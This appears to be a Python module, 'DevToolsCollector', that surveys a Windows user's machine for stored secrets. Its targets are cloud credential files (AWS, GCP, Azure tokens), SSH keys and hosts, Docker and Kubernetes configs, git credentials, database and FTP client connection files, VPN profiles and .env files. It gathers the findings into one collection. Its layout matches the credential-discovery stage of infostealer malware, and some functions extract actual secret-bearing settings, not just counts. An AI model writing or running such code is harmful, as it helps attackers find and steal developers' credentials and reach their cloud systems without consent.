import os
import json
import sqlite3
import configparser
from pathlib import Path
import base64
try:
    import yaml
except ImportError:
    yaml = None

class DevToolsCollector:
    def __init__(self):
        self.collected_data = {
            'ide_configs': {},
            'cloud_credentials': {},
            'ssh_keys': {},
            'docker_configs': {},
            'kubernetes_configs': {},
            'git_credentials': {},
            'database_connections': {},
            'api_keys': {},
            'vpn_configs': {},
            'ftp_credentials': {}
        }
        
        self.ide_paths = {
            'VS Code': {
                'settings': r'~\AppData\Roaming\Code\User\settings.json',
                'extensions': r'~\AppData\Roaming\Code\User\extensions',
                'workspaces': r'~\AppData\Roaming\Code\User\workspaceStorage',
                'keybindings': r'~\AppData\Roaming\Code\User\keybindings.json',
                'snippets': r'~\AppData\Roaming\Code\User\snippets',
                'state': r'~\AppData\Roaming\Code\storage.json'
            },
            'VS Code Insiders': {
                'settings': r'~\AppData\Roaming\Code - Insiders\User\settings.json',
                'extensions': r'~\AppData\Roaming\Code - Insiders\User\extensions'
            },
            'Visual Studio': {
                'settings': r'~\AppData\Local\Microsoft\VisualStudio',
                'projects': r'~\source\repos'
            },
            'JetBrains IntelliJ': {
                'config': r'~\AppData\Roaming\JetBrains\IntelliJIdea2023.2\options',
                'projects': r'~\AppData\Roaming\JetBrains\IntelliJIdea2023.2\projects'
            },
            'JetBrains PyCharm': {
                'config': r'~\AppData\Roaming\JetBrains\PyCharm2023.2\options',
                'projects': r'~\AppData\Roaming\JetBrains\PyCharm2023.2\projects'
            },
            'JetBrains WebStorm': {
                'config': r'~\AppData\Roaming\JetBrains\WebStorm2023.2\options',
                'projects': r'~\AppData\Roaming\JetBrains\WebStorm2023.2\projects'
            },
            'Sublime Text': {
                'settings': r'~\AppData\Roaming\Sublime Text\Packages\User\Preferences.sublime-settings',
                'projects': r'~\AppData\Roaming\Sublime Text\Local'
            },
            'Atom': {
                'config': r'~\.atom\config.cson',
                'packages': r'~\.atom\packages'
            },
            'Notepad++': {
                'config': r'~\AppData\Roaming\Notepad++\config.xml',
                'sessions': r'~\AppData\Roaming\Notepad++\session.xml'
            },
            'Eclipse': {
                'workspace': r'~\eclipse-workspace\.metadata',
                'config': r'~\.eclipse'
            }
        }
        
        self.cloud_paths = {
            'AWS': {
                'credentials': r'~\.aws\credentials',
                'config': r'~\.aws\config',
                'cli_cache': r'~\.aws\cli\cache'
            },
            'Google Cloud': {
                'credentials': r'~\AppData\Roaming\gcloud\credentials.db',
                'config': r'~\AppData\Roaming\gcloud\configurations',
                'keys': r'~\AppData\Roaming\gcloud\legacy_credentials'
            },
            'Azure': {
                'profile': r'~\.azure\azureProfile.json',
                'tokens': r'~\.azure\accessTokens.json',
                'config': r'~\.azure\config'
            },
            'DigitalOcean': {
                'config': r'~\.config\doctl\config.yaml'
            },
            'Heroku': {
                'credentials': r'~\.netrc',
                'config': r'~\AppData\Local\heroku\config.json'
            }
        }
        
        self.docker_paths = {
            'config': r'~\.docker\config.json',
            'daemon': r'~\.docker\daemon.json',
            'contexts': r'~\.docker\contexts',
            'desktop': r'~\AppData\Roaming\Docker Desktop'
        }
        
        self.k8s_paths = {
            'config': r'~\.kube\config',
            'cache': r'~\.kube\cache',
            'contexts': r'~\.kube\contexts'
        }
    
    def collect_all_dev_tools(self):
        self.collect_ide_configs()
        self.collect_cloud_credentials()
        self.collect_ssh_keys()
        self.collect_docker_configs()
        self.collect_kubernetes_configs()
        self.collect_git_credentials()
        self.collect_database_connections()
        self.collect_api_keys()
        self.collect_vpn_configs()
        self.collect_ftp_credentials()
        
        return self.collected_data
    
    def collect_ide_configs(self):
        for ide_name, paths in self.ide_paths.items():
            ide_data = {}
            
            for config_type, path in paths.items():
                expanded_path = os.path.expanduser(path)
                if os.path.exists(expanded_path):
                    data = self.extract_ide_data(expanded_path, ide_name, config_type)
                    if data:
                        ide_data[config_type] = data
            
            if ide_data:
                self.collected_data['ide_configs'][ide_name] = ide_data
    
    def extract_ide_data(self, path, ide_name, config_type):
        try:
            if ide_name == 'VS Code' and config_type == 'settings':
                return self.extract_vscode_settings(path)
            elif ide_name == 'VS Code' and config_type == 'extensions':
                return self.extract_vscode_extensions(path)
            elif 'JetBrains' in ide_name:
                return self.extract_jetbrains_config(path)
            elif ide_name == 'Sublime Text':
                return self.extract_sublime_config(path)
            else:
                return self.extract_generic_config(path)
        except Exception:
            return None
    
    def extract_vscode_settings(self, path):
        try:
            with open(path, 'r', encoding='utf-8') as f:
                settings = json.load(f)
            
            sensitive_keys = ['api', 'token', 'key', 'password', 'secret', 'credential']
            sensitive_data = {}
            
            for key, value in settings.items():
                if any(sensitive in key.lower() for sensitive in sensitive_keys):
                    sensitive_data[key] = value
            
            return {
                'total_settings': len(settings),
                'sensitive_settings': sensitive_data,
                'extensions_settings': {k: v for k, v in settings.items() if '.' in k}
            }
        except Exception:
            return None
    
    def extract_vscode_extensions(self, path):
        extensions = []
        try:
            if os.path.isdir(path):
                for ext_folder in os.listdir(path):
                    ext_path = os.path.join(path, ext_folder)
                    if os.path.isdir(ext_path):
                        package_json = os.path.join(ext_path, 'package.json')
                        if os.path.exists(package_json):
                            try:
                                with open(package_json, 'r', encoding='utf-8') as f:
                                    pkg_data = json.load(f)
                                extensions.append({
                                    'name': pkg_data.get('displayName', ext_folder),
                                    'id': pkg_data.get('name', ext_folder),
                                    'version': pkg_data.get('version', ''),
                                    'publisher': pkg_data.get('publisher', ''),
                                    'description': pkg_data.get('description', '')
                                })
                            except Exception:
                                extensions.append({'folder': ext_folder})
            return extensions
        except Exception:
            return None
    
    def extract_jetbrains_config(self, path):
        configs = []
        try:
            if os.path.isdir(path):
                for config_file in os.listdir(path):
                    if config_file.endswith('.xml'):
                        config_path = os.path.join(path, config_file)
                        with open(config_path, 'r', encoding='utf-8') as f:
                            content = f.read()
                            if any(keyword in content.lower() for keyword in ['password', 'token', 'key', 'credential']):
                                configs.append({
                                    'file': config_file,
                                    'contains_credentials': True
                                })
            return configs
        except Exception:
            return None
    
    def extract_sublime_config(self, path):
        try:
            with open(path, 'r', encoding='utf-8') as f:
                content = f.read()
            
            return {
                'config_size': len(content),
                'contains_packages': 'installed_packages' in content.lower()
            }
        except Exception:
            return None
    
    def extract_generic_config(self, path):
        try:
            if os.path.isfile(path):
                stat = os.stat(path)
                return {
                    'type': 'file',
                    'size': stat.st_size,
                    'modified': stat.st_mtime
                }
            elif os.path.isdir(path):
                file_count = 0
                total_size = 0
                for root, dirs, files in os.walk(path):
                    file_count += len(files)
                    for file in files:
                        try:
                            file_path = os.path.join(root, file)
                            total_size += os.path.getsize(file_path)
                        except Exception:
                            continue
                return {
                    'type': 'directory',
                    'file_count': file_count,
                    'total_size': total_size
                }
        except Exception:
            return None
    
    def collect_cloud_credentials(self):
        for cloud_name, paths in self.cloud_paths.items():
            cloud_data = {}
            
            for cred_type, path in paths.items():
                expanded_path = os.path.expanduser(path)
                if os.path.exists(expanded_path):
                    data = self.extract_cloud_data(expanded_path, cloud_name, cred_type)
                    if data:
                        cloud_data[cred_type] = data
            
            if cloud_data:
                self.collected_data['cloud_credentials'][cloud_name] = cloud_data
    
    def extract_cloud_data(self, path, cloud_name, cred_type):
        try:
            if cloud_name == 'AWS':
                return self.extract_aws_credentials(path, cred_type)
            elif cloud_name == 'Google Cloud':
                return self.extract_gcp_credentials(path, cred_type)
            elif cloud_name == 'Azure':
                return self.extract_azure_credentials(path, cred_type)
            else:
                return self.extract_generic_config(path)
        except Exception:
            return None
    
    def extract_aws_credentials(self, path, cred_type):
        try:
            if cred_type == 'credentials':
                config = configparser.ConfigParser()
                config.read(path)
                
                profiles = {}
                for section in config.sections():
                    profiles[section] = {
                        'has_access_key': 'aws_access_key_id' in config[section],
                        'has_secret_key': 'aws_secret_access_key' in config[section],
                        'has_session_token': 'aws_session_token' in config[section]
                    }
                return profiles
            
            elif cred_type == 'config':
                config = configparser.ConfigParser()
                config.read(path)
                
                return {
                    'profiles': list(config.sections()),
                    'regions': [config[section].get('region', '') for section in config.sections()]
                }
            
            return self.extract_generic_config(path)
        except Exception:
            return None
    
    def extract_gcp_credentials(self, path, cred_type):
        try:
            if cred_type == 'credentials':
                if path.endswith('.db'):
                    conn = sqlite3.connect(path)
                    cursor = conn.cursor()
                    
                    try:
                        cursor.execute("SELECT name FROM sqlite_master WHERE type='table'")
                        tables = [row[0] for row in cursor.fetchall()]
                        
                        credentials_found = []
                        for table in tables:
                            cursor.execute(f"SELECT * FROM {table} LIMIT 1")
                            if cursor.fetchone():
                                credentials_found.append(table)
                        
                        conn.close()
                        return {'tables_with_data': credentials_found}
                    except Exception:
                        conn.close()
                        return {'database_exists': True}
            
            return self.extract_generic_config(path)
        except Exception:
            return None
    
    def extract_azure_credentials(self, path, cred_type):
        try:
            with open(path, 'r', encoding='utf-8') as f:
                content = json.load(f)
            
            if cred_type == 'profile':
                return {
                    'subscriptions': len(content.get('subscriptions', [])),
                    'has_login_tenant': 'loginTenantId' in content
                }
            elif cred_type == 'tokens':
                return {
                    'token_count': len(content) if isinstance(content, list) else 1,
                    'has_refresh_token': any('refreshToken' in str(item) for item in (content if isinstance(content, list) else [content]))
                }
            
            return {'data_found': True}
        except Exception:
            return None
    
    def collect_ssh_keys(self):
        ssh_dir = os.path.expanduser('~/.ssh')
        if os.path.exists(ssh_dir):
            ssh_data = {}
            
            key_files = ['id_rsa', 'id_dsa', 'id_ecdsa', 'id_ed25519']
            for key_file in key_files:
                private_key = os.path.join(ssh_dir, key_file)
                public_key = os.path.join(ssh_dir, f'{key_file}.pub')
                
                if os.path.exists(private_key) or os.path.exists(public_key):
                    ssh_data[key_file] = {
                        'has_private': os.path.exists(private_key),
                        'has_public': os.path.exists(public_key)
                    }
            
            config_file = os.path.join(ssh_dir, 'config')
            if os.path.exists(config_file):
                ssh_data['config'] = self.extract_ssh_config(config_file)
            
            known_hosts = os.path.join(ssh_dir, 'known_hosts')
            if os.path.exists(known_hosts):
                ssh_data['known_hosts'] = self.extract_known_hosts(known_hosts)
            
            if ssh_data:
                self.collected_data['ssh_keys'] = ssh_data
    
    def extract_ssh_config(self, config_path):
        try:
            with open(config_path, 'r', encoding='utf-8') as f:
                content = f.read()
            
            hosts = []
            for line in content.split('\n'):
                line = line.strip()
                if line.startswith('Host ') and not line.startswith('Host *'):
                    host = line[5:].strip()
                    hosts.append(host)
            
            return {
                'host_count': len(hosts),
                'hosts': hosts[:10]
            }
        except Exception:
            return None
    
    def extract_known_hosts(self, known_hosts_path):
        try:
            with open(known_hosts_path, 'r', encoding='utf-8') as f:
                lines = f.readlines()
            
            hosts = []
            for line in lines:
                if line.strip() and not line.startswith('#'):
                    host_part = line.split(' ')[0]
                    hosts.append(host_part)
            
            return {
                'host_count': len(hosts),
                'sample_hosts': hosts[:10]
            }
        except Exception:
            return None
    
    def collect_docker_configs(self):
        docker_data = {}
        
        for config_type, path in self.docker_paths.items():
            expanded_path = os.path.expanduser(path)
            if os.path.exists(expanded_path):
                data = self.extract_docker_data(expanded_path, config_type)
                if data:
                    docker_data[config_type] = data
        
        if docker_data:
            self.collected_data['docker_configs'] = docker_data
    
    def extract_docker_data(self, path, config_type):
        try:
            if config_type == 'config':
                with open(path, 'r', encoding='utf-8') as f:
                    config = json.load(f)
                
                return {
                    'has_auths': 'auths' in config,
                    'registry_count': len(config.get('auths', {})),
                    'has_credential_helpers': 'credHelpers' in config
                }
            
            return self.extract_generic_config(path)
        except Exception:
            return None
    
    def collect_kubernetes_configs(self):
        k8s_data = {}
        
        for config_type, path in self.k8s_paths.items():
            expanded_path = os.path.expanduser(path)
            if os.path.exists(expanded_path):
                data = self.extract_k8s_data(expanded_path, config_type)
                if data:
                    k8s_data[config_type] = data
        
        if k8s_data:
            self.collected_data['kubernetes_configs'] = k8s_data
    
    def extract_k8s_data(self, path, config_type):
        try:
            if config_type == 'config' and yaml:
                with open(path, 'r', encoding='utf-8') as f:
                    config = yaml.safe_load(f)
                
                return {
                    'cluster_count': len(config.get('clusters', [])),
                    'user_count': len(config.get('users', [])),
                    'context_count': len(config.get('contexts', [])),
                    'current_context': config.get('current-context', '')
                }
            
            return self.extract_generic_config(path)
        except Exception:
            return None
    
    def collect_git_credentials(self):
        git_data = {}
        
        git_config_global = os.path.expanduser('~/.gitconfig')
        if os.path.exists(git_config_global):
            git_data['global_config'] = self.extract_git_config(git_config_global)
        
        git_credentials = os.path.expanduser('~/.git-credentials')
        if os.path.exists(git_credentials):
            git_data['credentials'] = self.extract_git_credentials_file(git_credentials)
        
        if git_data:
            self.collected_data['git_credentials'] = git_data
    
    def extract_git_config(self, config_path):
        try:
            config = configparser.ConfigParser()
            config.read(config_path)
            
            user_info = {}
            if 'user' in config:
                user_info = dict(config['user'])
            
            return {
                'user_info': user_info,
                'sections': list(config.sections())
            }
        except Exception:
            return None
    
    def extract_git_credentials_file(self, creds_path):
        try:
            with open(creds_path, 'r', encoding='utf-8') as f:
                lines = f.readlines()
            
            credentials = []
            for line in lines:
                if '://' in line and '@' in line:
                    url_part = line.strip()
                    credentials.append({
                        'url': url_part.split('://')[0] + '://',
                        'has_credentials': True
                    })
            
            return {'credential_count': len(credentials)}
        except Exception:
            return None
    
    def collect_database_connections(self):
        db_data = {}
        
        db_tools = {
            'HeidiSQL': r'~\AppData\Roaming\HeidiSQL\sessions.txt',
            'Navicat': r'~\AppData\Roaming\PremiumSoft\Navicat Premium\connections.ncx',
            'DBeaver': r'~\.dbeaver\General\.dbeaver-data-sources.xml',
            'MySQL Workbench': r'~\AppData\Roaming\MySQL\Workbench\connections.xml',
            'pgAdmin': r'~\.pgpass'
        }
        
        for tool_name, path in db_tools.items():
            expanded_path = os.path.expanduser(path)
            if os.path.exists(expanded_path):
                data = self.extract_db_connections(expanded_path, tool_name)
                if data:
                    db_data[tool_name] = data
        
        if db_data:
            self.collected_data['database_connections'] = db_data
    
    def extract_db_connections(self, path, tool_name):
        try:
            if tool_name == 'DBeaver':
                with open(path, 'r', encoding='utf-8') as f:
                    content = f.read()
                
                return {
                    'has_connections': 'connection' in content.lower(),
                    'connection_count': content.count('<connection')
                }
            
            return self.extract_generic_config(path)
        except Exception:
            return None
    
    def collect_api_keys(self):
        api_data = {}
        
        common_files = [
            '~/.env',
            '~/.environment',
            '~/Desktop/.env',
            '~/Documents/.env'
        ]
        
        for file_path in common_files:
            expanded_path = os.path.expanduser(file_path)
            if os.path.exists(expanded_path):
                data = self.extract_env_file(expanded_path)
                if data:
                    api_data[os.path.basename(expanded_path)] = data
        
        if api_data:
            self.collected_data['api_keys'] = api_data
    
    def extract_env_file(self, env_path):
        try:
            with open(env_path, 'r', encoding='utf-8') as f:
                lines = f.readlines()
            
            api_keys = []
            for line in lines:
                line = line.strip()
                if '=' in line and any(keyword in line.upper() for keyword in ['API', 'KEY', 'TOKEN', 'SECRET']):
                    var_name = line.split('=')[0]
                    api_keys.append(var_name)
            
            return {'api_key_count': len(api_keys), 'variables': api_keys}
        except Exception:
            return None
    
    def collect_vpn_configs(self):
        vpn_data = {}
        
        vpn_paths = {
            'OpenVPN': r'~\AppData\Roaming\OpenVPN Connect\profiles',
            'WireGuard': r'~\AppData\Local\WireGuard\Data\Configurations',
            'NordVPN': r'~\AppData\Local\NordVPN',
            'ExpressVPN': r'~\AppData\Local\ExpressVPN',
            'CyberGhost': r'~\AppData\Local\CyberGhost'
        }
        
        for vpn_name, path in vpn_paths.items():
            expanded_path = os.path.expanduser(path)
            if os.path.exists(expanded_path):
                data = self.extract_vpn_config(expanded_path, vpn_name)
                if data:
                    vpn_data[vpn_name] = data
        
        if vpn_data:
            self.collected_data['vpn_configs'] = vpn_data
    
    def extract_vpn_config(self, path, vpn_name):
        try:
            if vpn_name == 'OpenVPN':
                profiles = []
                if os.path.isdir(path):
                    for file in os.listdir(path):
                        if file.endswith('.ovpn'):
                            profiles.append(file)
                return {'profile_count': len(profiles)}
            
            return self.extract_generic_config(path)
        except Exception:
            return None
    
    def collect_ftp_credentials(self):
        ftp_data = {}
        
        ftp_clients = {
            'FileZilla': r'~\AppData\Roaming\FileZilla\sitemanager.xml',
            'WinSCP': r'~\AppData\Roaming\WinSCP\WinSCP.ini',
            'Core FTP': r'~\AppData\Roaming\CoreFTP\sites.idx'
        }
        
        for client_name, path in ftp_clients.items():
            expanded_path = os.path.expanduser(path)
            if os.path.exists(expanded_path):
                data = self.extract_ftp_config(expanded_path, client_name)
                if data:
                    ftp_data[client_name] = data
        
        if ftp_data:
            self.collected_data['ftp_credentials'] = ftp_data
    
    def extract_ftp_config(self, path, client_name):
        try:
            if client_name == 'FileZilla':
                with open(path, 'r', encoding='utf-8') as f:
                    content = f.read()
                
                return {
                    'has_servers': '<Server>' in content,
                    'server_count': content.count('<Server>')
                }
            
            return self.extract_generic_config(path)
        except Exception:
            return None
